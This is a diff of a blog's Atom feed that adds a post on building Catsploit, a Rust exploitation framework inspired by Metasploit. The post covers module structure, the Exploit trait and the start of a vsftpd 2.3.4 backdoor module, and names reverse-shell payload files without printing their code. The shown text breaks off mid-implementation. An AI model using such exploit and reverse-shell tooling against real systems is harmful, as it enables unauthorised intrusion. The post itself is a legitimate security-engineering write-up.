@@ -1,25 +1,434 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-06T15:46:00+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MarkR Cybersecurity Blog</title><subtitle>Cybersecurity blog</subtitle><entry><title type="html">Another Post</title><link href="http://localhost:4000/markdown/2023/05/06/another-post.html" rel="alternate" type="text/html" title="Another Post" /><published>2023-05-06T00:00:00+01:00</published><updated>2023-05-06T00:00:00+01:00</updated><id>http://localhost:4000/markdown/2023/05/06/another-post</id><content type="html" xml:base="http://localhost:4000/markdown/2023/05/06/another-post.html">&lt;p&gt;Welcome to my first blog post!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-07T13:59:57+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MarkR Cybersecurity Blog</title><subtitle>Cybersecurity blog</subtitle><entry><title type="html">Developing a Metasploit Alternative - Catsploit</title><link href="http://localhost:4000/markdown/2023/05/07/developing-a-metasploit-alternative-catsploit.html" rel="alternate" type="text/html" title="Developing a Metasploit Alternative - Catsploit" /><published>2023-05-07T00:00:00+01:00</published><updated>2023-05-07T00:00:00+01:00</updated><id>http://localhost:4000/markdown/2023/05/07/developing-a-metasploit-alternative-catsploit</id><content type="html" xml:base="http://localhost:4000/markdown/2023/05/07/developing-a-metasploit-alternative-catsploit.html">&lt;p&gt;In an attempt to build a new open-source cybersecurity tool for my own usage and to build some experience, I developed &lt;a href=&quot;https://github.com/mark-ruddy/catsploit&quot;&gt;Catsploit&lt;/a&gt;. Catsploit is an exploitation framework inspired by &lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;Metasploit&lt;/a&gt;. This post relates to the code itself, especially the modular requirements for an exploit framework, and discusses why Metasploit will probably remain king as the go-to open-source generalist exploit framework.&lt;/p&gt;
 
-&lt;p&gt;Here’s some content for my post. I can use Markdown to format it, like this:&lt;/p&gt;
+&lt;h2 id=&quot;catsploit-development&quot;&gt;Catsploit development&lt;/h2&gt;
 
-&lt;h2 id=&quot;another-heading-2&quot;&gt;Another Heading 2&lt;/h2&gt;
+&lt;h3 id=&quot;structure&quot;&gt;Structure&lt;/h3&gt;
+
+&lt;p&gt;Source code: https://github.com/mark-ruddy/catsploit
+Catsploit is layed out in a common format of a separate library to application/interface:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[main][~/dev/default/catsploit]$ tree -L 2   
+.
+├── catsploit
+│   ├── Cargo.lock
+│   ├── Cargo.toml
+│   ├── src
+│   └── target
+├── catsploit_lib
+│   ├── Cargo.lock
+│   ├── Cargo.toml
+│   ├── README.md
+│   ├── src
+│   └── target
+├── LICENSE
+└── README.md
+
+7 directories, 7 files
+[main][~/dev/default/catsploit]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;bullet point 1&lt;/li&gt;
-  &lt;li&gt;bullet point 2&lt;/li&gt;
-&lt;/ul&gt;</content><author><name></name></author><category term="markdown" /><summary type="html">Welcome to my first blog post!</summary></entry><entry><title type="html">My First Post</title><link href="http://localhost:4000/markdown/2023/05/06/my-first-post.html" rel="alternate" type="text/html" title="My First Post" /><published>2023-05-06T00:00:00+01:00</published><updated>2023-05-06T00:00:00+01:00</updated><id>http://localhost:4000/markdown/2023/05/06/my-first-post</id><content type="html" xml:base="http://localhost:4000/markdown/2023/05/06/my-first-post.html">&lt;p&gt;Welcome to my first blog post!&lt;/p&gt;
-
-&lt;p&gt;Here’s some content for my post. I can use Markdown to format it, like this:&lt;/p&gt;
-
-&lt;h2 id=&quot;heading-2&quot;&gt;Heading 2&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;bullet point 1&lt;/li&gt;
-  &lt;li&gt;bullet point 2&lt;/li&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit&lt;/code&gt; directory contains only the code to create the CLI app, such as the user input loop and dealing with setting module options. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit&lt;/code&gt; interacts with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; library&lt;/li&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; directory contains the library. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; contains the functional code for carrying out tasks with Catsploit. For example the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; trait and also the individual modules such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vsftpd234Backdoor&lt;/code&gt; exploit&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;And I can also include code snippets, like this:&lt;/p&gt;
+&lt;p&gt;This structure of a split between the CLI app and the library allows other custom applications to hook into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; and use its functionality. For example an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;axum&lt;/code&gt; server could be written in the future to allow calling of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; code from a website.&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hello_world&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello, world!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="markdown" /><summary type="html">Welcome to my first blog post!</summary></entry></feed>
+&lt;h4 id=&quot;separate-library-and-application&quot;&gt;Separate library and application&lt;/h4&gt;
+
+&lt;p&gt;During local development, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cargo.toml&lt;/code&gt; of the application that is hooking into the library can be set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt;. When hosting the crate of the application on &lt;a href=&quot;https://crates.io/&quot;&gt;crates.io&lt;/a&gt; though, it must be a version number that is another crate hosted on crates.io:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[dependencies]
+# NOTE: when doing local development on CLI with changes to library, can change dependency to path instead of crates.io version
+catsploit_lib = { path = &quot;../catsploit_lib&quot; }
+# catsploit_lib = &quot;0.1.0&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;the-library&quot;&gt;The library&lt;/h3&gt;
+&lt;p&gt;The library consists of all relevant code that is not related directly to user interaction - exploits, payloads, auxiliary modules etc:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[main][~/dev/default/tirax_lab/catsploit/catsploit_lib/src]$ tree .
+.
+├── core
+│   ├── auxiliary.rs
+│   ├── exploit
+│   │   └── remote_tcp.rs
+│   ├── exploit.rs
+│   ├── handler
+│   │   └── generic_tcp_handler.rs
+│   ├── handler.rs
+│   ├── opt.rs
+│   ├── payload
+│   │   └── reverse.rs
+│   └── payload.rs
+├── core.rs
+├── lib.rs
+├── module
+│   ├── auxiliary
+│   │   ├── osint
+│   │   │   └── my_ip.rs
+│   │   └── osint.rs
+│   ├── auxiliary.rs
+│   ├── exploit
+│   │   ├── ftp
+│   │   │   └── vsftpd_234_backdoor.rs
+│   │   └── ftp.rs
+│   ├── exploit.rs
+│   ├── index.rs
+│   ├── payload
+│   │   ├── linux_shell
+│   │   │   └── nc_mkfifo_reverse_tcp.rs
+│   │   ├── linux_shell.rs
+│   │   ├── ruby
+│   │   │   └── ruby_reverse_tcp.rs
+│   │   └── ruby.rs
+│   └── payload.rs
+├── module.rs
+├── util
+│   └── gen.rs
+└── util.rs
+
+14 directories, 25 files
+[main][~/dev/default/tirax_lab/catsploit/catsploit_lib/src]$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;library-core-and-traits&quot;&gt;Library core and traits&lt;/h4&gt;
+
+&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;core&lt;/code&gt; we have the logic that defines how the framework works - which are primarily defined with &lt;a href=&quot;https://doc.rust-lang.org/book/ch10-02-traits.html&quot;&gt;Rust Traits&lt;/a&gt;. For example in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.rs&lt;/code&gt; we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; trait:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;trait&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exploit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Self&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;Self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sized&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ranking&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ranking&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nn&quot;&gt;Ranking&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Average&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payload_compat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PayloadCompat&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nn&quot;&gt;PayloadCompat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;// TODO: does payload need to be borrowed box?&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;#[allow(clippy::borrowed_box)]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this code we define the required methods/functions(see &lt;a href=&quot;https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions&quot;&gt;Associated Functions&lt;/a&gt;) that a type must have to be able to implement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt;. Rust Traits are very similar to Go’s &lt;a href=&quot;https://gobyexample.com/interfaces&quot;&gt;Interfaces&lt;/a&gt;, with the primary difference being that a Rust type will only implement a trait if its defined explicitly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impl Trait for MyStruct&lt;/code&gt;, while a Go type will implicitly implement an interface if it happens to have all of the method signatures defined on itself.&lt;/p&gt;
+
+&lt;p&gt;Metasploit on the other hand is written in Ruby, which is probably the most OOP language I’ve ever worked with(I don’t really know how to phrase that), with its “everything is an object” philosophy. It uses OOP inheritance to accomplish defining an exploit:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;###&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# The exploit class acts as the base class for all exploit modules.  It&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# provides a common interface for interacting with exploits at the most basic&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# level.&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;###&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Msf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Module&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;##&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;# Exceptions&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;##&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;# Indicate that the exploit should abort because it has completed&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Complete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;RuntimeError&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;# Indicate that the exploit should abort because it has failed&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Failed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;RuntimeError&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A specific exploit will inherit from the base &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; class, which itself inherits from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Msf::Module&lt;/code&gt;. The Rust/Go approach could be described as compisition while Ruby uses inheritance. For this use-case of defining what all exploits must be able to do, I think both ways are good solutions.&lt;/p&gt;
+
+&lt;p&gt;The reason that an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; trait/class/interface is needed for an exploit framework is so that it can be modular. New exploits are released everyday, and an exploit framework will require a lot of logic to index them, run them, etc. There must be a common interface defined for this so that the a new exploit can be slotted in.&lt;/p&gt;
+
+&lt;h4 id=&quot;from-a-trait-to-a-working-module&quot;&gt;From a trait to a working module&lt;/h4&gt;
+&lt;p&gt;A new exploit can now be added to the framework by adding a single file, for example &lt;a href=&quot;https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/module/exploit/ftp/vsftpd_234_backdoor.rs&quot;&gt;vsftpd_234_backdoor.rs&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In this Rust file, we define a struct on which we define the exploits options and any extra types it needs to complete its work:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Vsftpd234Backdoor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_tcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RemoteTcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/core/exploit/remote_tcp.rs&quot;&gt;remote_tcp.rs&lt;/a&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;core&lt;/code&gt; of the library provides a type that has functions for opening TCP connections. This is another element of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;core&lt;/code&gt; code apart from Traits, extra types that can be shared throughout modules.&lt;/p&gt;
+
+&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd_234_backdoor.rs&lt;/code&gt; file, we can then add whatever extra code we need and importantly explicitly implement the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt; trait for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vsftpd234Backdoor&lt;/code&gt; type:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;impl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exploit&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Vsftpd234Backdoor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.attempt_backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
